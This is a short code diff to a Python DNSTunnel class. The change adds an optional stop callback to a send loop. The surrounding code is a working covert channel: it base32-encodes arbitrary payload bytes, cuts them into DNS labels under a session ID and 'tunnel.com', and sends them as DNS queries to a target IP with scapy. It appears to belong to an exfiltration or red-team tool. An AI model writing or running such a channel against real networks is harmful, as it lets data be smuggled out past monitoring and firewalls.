@@ -9,7 +9,7 @@ class DNSTunnel:
     """
     
     @staticmethod
-    def send(payload_bytes: bytes, target_ip: str, session_id: str):
+    def send(payload_bytes: bytes, target_ip: str, session_id: str, should_stop=None):
         # Base32 is safer for DNS labels (case insensitive, alphanumeric)
         encoded: str = base64.b32encode(payload_bytes).decode('utf-8').rstrip('=')
         
@@ -19,6 +19,8 @@ class DNSTunnel:
         chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
         
         for chunk in chunks:
+            if should_stop and should_stop():
+                break
             query = f"{chunk}.{session_id}.tunnel.com"
             pkt = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query))
             send(pkt, verbose=False)
